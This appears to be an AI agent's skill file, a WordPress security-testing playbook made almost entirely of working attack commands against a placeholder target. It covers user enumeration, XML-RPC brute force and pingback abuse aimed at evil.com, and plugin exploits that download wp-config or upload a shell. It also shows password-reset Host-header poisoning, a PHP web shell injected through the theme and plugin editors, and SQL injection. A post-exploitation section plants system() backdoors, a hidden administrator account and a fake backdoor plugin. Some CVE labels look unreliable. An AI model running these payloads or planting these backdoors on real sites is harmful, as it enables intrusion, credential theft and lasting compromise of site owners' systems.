---
name: wordpress
description: WordPress security testing - core vulnerabilities, plugin/theme attacks, and WordPress-specific exploitation
---

# WordPress Security Testing

## Fingerprinting

### Identify WordPress
```bash
# Check for WordPress markers
curl -s https://target.com | grep -i "wp-content\|wp-includes\|wordpress"

# Check meta generator
curl -s https://target.com | grep -o '<meta name="generator" content="WordPress [0-9.]*"'

# Check for wp-login.php
curl -s https://target.com/wp-login.php
curl -s https://target.com/wp-admin/
```

### Version Detection
```bash
# Check readme.html
curl -s https://target.com/readme.html | grep -o "Version [0-9.]*"

# Check wp-includes/version.php (if exposed)
curl -s https://target.com/wp-includes/version.php

# Check RSS feed
curl -s https://target.com/feed/ | grep -o "generator>https://wordpress.org/?v=[0-9.]*"

# Use wpscan
wpscan --url https://target.com --api-token $WPSCAN_API_KEY
```

## Core Vulnerabilities

### 1. User Enumeration
```bash
# Enumerate users via author archives
curl -s https://target.com/?author=1
curl -s https://target.com/?author=2
curl -s https://target.com/?author=3

# Enumerate via REST API
curl -s https://target.com/wp-json/wp/v2/users
curl -s https://target.com/wp-json/wp/v2/users/1

# Enumerate via oEmbed
curl -s "https://target.com/wp-json/oembed/1.0/embed?url=https://target.com/?author=1"

# Use wpscan
wpscan --url https://target.com --enumerate u --api-token $WPSCAN_API_KEY
```

### 2. XML-RPC Abuse
```bash
# Check if XML-RPC is enabled
curl -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# Brute force via XML-RPC
curl -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password123</value></param></params></methodCall>'

# Pingback DDoS
curl -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value>http://evil.com</value></param><param><value>https://target.com/sample-post/</value></param></params></methodCall>'
```

### 3. REST API Vulnerabilities
```bash
# Enumerate REST API endpoints
curl -s https://target.com/wp-json/
curl -s https://target.com/wp-json/wp/v2/

# User enumeration (if not disabled)
curl -s https://target.com/wp-json/wp/v2/users

# Content injection (CVE-2017-1001000)
curl -X POST https://target.com/wp-json/wp/v2/posts/1 \
  -H "Content-Type: application/json" \
  -d '{"title": "Hacked", "content": "Defaced"}'

# Check for exposed custom endpoints
curl -s https://target.com/wp-json/custom/v1/
```

### 4. Default Credentials
```bash
# Test default credentials
curl -X POST https://target.com/wp-login.php \
  -d "log=admin&pwd=admin&wp-submit=Log+In"

curl -X POST https://target.com/wp-login.php \
  -d "log=admin&pwd=password&wp-submit=Log+In"

curl -X POST https://target.com/wp-login.php \
  -d "log=admin&pwd=admin123&wp-submit=Log+In"
```

### 5. Directory Listing
```bash
# Check for directory listing
curl -s https://target.com/wp-content/uploads/
curl -s https://target.com/wp-content/plugins/
curl -s https://target.com/wp-content/themes/
curl -s https://target.com/wp-includes/
```

## Plugin Vulnerabilities

### 1. Vulnerable Plugin Detection
```bash
# Use wpscan
wpscan --url https://target.com --enumerate vp --api-token $WPSCAN_API_KEY

# Manual check for common vulnerable plugins
curl -s https://target.com/wp-content/plugins/revslider/
curl -s https://target.com/wp-content/plugins/contact-form-7/
curl -s https://target.com/wp-content/plugins/elementor/
curl -s https://target.com/wp-content/plugins/woocommerce/
```

### 2. Common Plugin Exploits

**RevSlider (Slider Revolution) - Arbitrary File Download**
```bash
curl "https://target.com/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
```

**Contact Form 7 - Unrestricted File Upload (CVE-2020-35489)**
```bash
curl -X POST https://target.com/wp-json/contact-form-7/v1/contact-forms/1/feedback \
  -F "file=@shell.php.jpg"
```

**Elementor - Unauthenticated RCE (CVE-2023-32243)**
```bash
curl -X POST https://target.com/wp-admin/admin-ajax.php \
  -d "action=elementor_pro_forms_submit&post_id=1&form_id=1"
```

### 3. Plugin Enumeration
```bash
# Use wpscan
wpscan --url https://target.com --enumerate ap --api-token $WPSCAN_API_KEY

# Manual enumeration via readme.txt
curl -s https://target.com/wp-content/plugins/plugin-name/readme.txt | grep -i "stable tag"

# Check plugin JavaScript files
curl -s https://target.com/wp-content/plugins/plugin-name/assets/js/script.js
```

## Theme Vulnerabilities

### 1. Vulnerable Theme Detection
```bash
# Use wpscan
wpscan --url https://target.com --enumerate at --api-token $WPSCAN_API_KEY

# Manual check for common vulnerable themes
curl -s https://target.com/wp-content/themes/twentytwentyone/
curl -s https://target.com/wp-content/themes/flavor/
```

### 2. Theme File Disclosure
```bash
# Check for exposed theme files
curl -s https://target.com/wp-content/themes/theme-name/functions.php
curl -s https://target.com/wp-content/themes/theme-name/style.css

# Check for backup files
curl -s https://target.com/wp-content/themes/theme-name/functions.php.bak
curl -s https://target.com/wp-content/themes/theme-name/style.css.old
```

## Advanced Attacks

### 1. wp-config.php Disclosure
```bash
# Try to access wp-config.php
curl -s https://target.com/wp-config.php
curl -s https://target.com/wp-config.php.bak
curl -s https://target.com/wp-config.php.old
curl -s https://target.com/wp-config.php~
curl -s https://target.com/wp-config.php.save

# Try via LFI vulnerabilities
curl "https://target.com/page.php?file=../../../../wp-config.php"
```

### 2. Database Credential Extraction
```bash
# If wp-config.php is exposed, extract database credentials
curl -s https://target.com/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST"

# Example output:
# define('DB_NAME', 'wordpress');
# define('DB_USER', 'root');
# define('DB_PASSWORD', 'password');
# define('DB_HOST', 'localhost');
```

### 3. Admin Account Takeover

**Password Reset Poisoning**
```bash
# Request password reset with Host header injection
curl -X POST https://target.com/wp-login.php?action=lostpassword \
  -H "Host: evil.com" \
  -d "user_login=admin&redirect_to=&wp-submit=Get+New+Password"

# Check if reset email contains evil.com
```

**User Registration**
```bash
# If registration is enabled, register admin account
curl -X POST https://target.com/wp-login.php?action=register \
  -d "user_login=newadmin&user_email=newadmin@evil.com"

# Check email for password
```

### 4. Authenticated RCE

**Theme Editor**
```bash
# If you have admin access, edit theme files
curl -X POST https://target.com/wp-admin/theme-editor.php \
  -d "file=functions.php&theme=twentytwentyone&newcontent=<?php system(\$_GET['cmd']); ?>"

# Access shell
curl "https://target.com/wp-content/themes/twentytwentyone/functions.php?cmd=id"
```

**Plugin Editor**
```bash
# Edit plugin files
curl -X POST https://target.com/wp-admin/plugin-editor.php \
  -d "file=plugin-name/plugin.php&plugin=plugin-name/plugin.php&newcontent=<?php system(\$_GET['cmd']); ?>"

# Access shell
curl "https://target.com/wp-content/plugins/plugin-name/plugin.php?cmd=id"
```

### 5. SQL Injection in WordPress
```bash
# Test for SQLi in search
curl "https://target.com/?s=admin' OR '1'='1"

# Test for SQLi in custom queries
curl "https://target.com/custom-page?id=1' UNION SELECT 1,2,3,4,5--"

# Use SQLMap
sqlmap -u "https://target.com/?s=test" --dbms=mysql
```

## Testing Checklist

- [ ] Identify WordPress version
- [ ] Enumerate users
- [ ] Test XML-RPC abuse
- [ ] Test REST API vulnerabilities
- [ ] Test default credentials
- [ ] Check for directory listing
- [ ] Enumerate plugins (use wpscan)
- [ ] Test for vulnerable plugins
- [ ] Enumerate themes
- [ ] Test for vulnerable themes
- [ ] Try to access wp-config.php
- [ ] Test password reset poisoning
- [ ] Test user registration (if enabled)
- [ ] Test for SQL injection
- [ ] Check for authenticated RCE (if admin access obtained)

## Tools

```bash
# WPScan (primary tool)
wpscan --url https://target.com --api-token $WPSCAN_API_KEY --enumerate u,ap,at

# SQLMap for WordPress
sqlmap -u "https://target.com/?s=test" --dbms=mysql --level=5 --risk=3

# Nuclei templates for WordPress
nuclei -u https://target.com -t ~/nuclei-templates/technologies/wordpress/
nuclei -u https://target.com -t ~/nuclei-templates/cves/wordpress/

# WordPress exploitation framework
# https://github.com/rastating/wordpress-exploit-framework
```

## Post-Exploitation

### 1. Extract User Passwords
```bash
# If you have database access
SELECT user_login, user_pass FROM wp_users;

# Crack password hashes
hashcat -m 400 wp_hashes.txt rockyou.txt
john --wordlist=rockyou.txt wp_hashes.txt
```

### 2. Create Backdoor
```bash
# Add backdoor to theme
echo '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>' >> /var/www/html/wp-content/themes/twentytwentyone/functions.php

# Add backdoor user
INSERT INTO wp_users (user_login, user_pass, user_email, user_registered) VALUES ('backdoor', MD5('password'), 'backdoor@evil.com', NOW());
INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}');
```

### 3. Persistence
```bash
# Add malicious plugin
mkdir /var/www/html/wp-content/plugins/backdoor
echo '<?php /* Plugin Name: Backdoor */ if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>' > /var/www/html/wp-content/plugins/backdoor/backdoor.php

# Modify .htaccess
echo 'RewriteEngine On' >> /var/www/html/.htaccess
echo 'RewriteRule ^backdoor\.php$ - [L]' >> /var/www/html/.htaccess
```
